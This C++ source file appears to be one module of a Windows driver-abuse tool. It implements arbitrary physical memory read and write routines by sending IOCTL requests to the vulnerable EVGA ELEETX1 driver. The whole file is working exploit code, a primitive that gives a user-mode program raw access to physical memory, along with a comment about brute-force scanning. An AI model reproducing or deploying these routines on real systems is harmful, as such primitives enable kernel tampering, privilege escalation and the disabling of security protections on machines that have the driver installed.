/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023
*
*  TITLE:       EVGA.CPP
*
*  VERSION:     1.41
*
*  DATE:        10 Dec 2023
*
*  EVGA driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/evga.h"

/*
* 
*  WARNING: Bruteforce can take a lot of time because ELEETX1 driver does a lot of debug prints.
* 
*/

/*
* EvgaReadPhysicalMemory
*
* Purpose:
*
* Read physical memory through MmMapIoSpace.
* Input buffer length must be aligned to ULONG_PTR
*
*/
BOOL WINAPI EvgaReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    if ((NumberOfBytes % sizeof(ULONG_PTR)) != 0)
        return FALSE;

    PULONG_PTR BufferPtr = (PULONG_PTR)Buffer;

    ULONG_PTR address = PhysicalAddress;
    ULONG_PTR valueRead, readBytes = 0;

    for (ULONG_PTR i = 0; i < NumberOfBytes / sizeof(ULONG_PTR); i++) {

        valueRead = 0;

        if (!supCallDriver(DeviceHandle,
            IOCTL_EVGA_ELEETX1_READ_PHYSMEM,
            &address,
            sizeof(address),
            &valueRead,
            sizeof(valueRead)))
        {
            break;
        }

        BufferPtr[i] = valueRead;
        address += sizeof(ULONG_PTR);
        readBytes += sizeof(ULONG_PTR);
    }

    return (readBytes == NumberOfBytes);

}

/*
* EvgaWritePhysicalMemory
*
* Purpose:
*
* Write physical memory through MmMapIoSpace.
*
*/
_Success_(return != FALSE)
BOOL WINAPI EvgaWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    EVGA_ELEETX1_WRITE_REQUEST request;

    PBYTE BufferPtr = (PBYTE)Buffer;

    ULONG_PTR address = PhysicalAddress;
    ULONG writeBytes = 0;

    for (ULONG i = 0; i < NumberOfBytes; i++) {

        request.Value = BufferPtr[i];
        request.Address.QuadPart = address;

        if (!supCallDriver(DeviceHandle,
            IOCTL_EVGA_ELEETX1_WRITE_PHYSMEM,
            &request,
            sizeof(request),
            NULL,
            0))
        {
            break;
        }

        address += sizeof(BYTE);
        writeBytes += sizeof(BYTE);
    }

    return (writeBytes == NumberOfBytes);
}
